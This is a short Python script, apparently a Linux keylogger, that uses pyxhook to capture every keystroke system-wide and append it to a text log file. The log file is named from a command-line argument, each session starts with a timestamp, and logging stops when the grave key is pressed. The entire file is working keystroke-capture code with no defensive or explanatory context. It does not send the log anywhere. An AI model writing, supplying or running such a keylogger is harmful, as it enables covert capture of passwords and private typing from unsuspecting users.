import sys
import datetime
import pyxhook
import os
import commands

hook=pyxhook.HookManager()


def writetofile(event):
	with open(outf, "a") as f:
		
		if event.Key == "space":
			f.write(" ")
		elif event.Ascii ==0:
			f.write("\n")
		else:
			f.write(event.Key)

		if event.Ascii==96: #96 is the ascii value of the grave key (`)
    			hook.cancel()
    			f.close()

if __name__ == '__main__':
	try: 
		outf = sys.argv[1]
		outf = outf + ".txt"
	except IndexError:
		outf = "log.txt"

	f = open(outf, "a")
	f.write(str(datetime.datetime.now()) + "\n")
	f.close()

	hook.KeyDown=writetofile
	hook.HookKeyboard()
	hook.start()
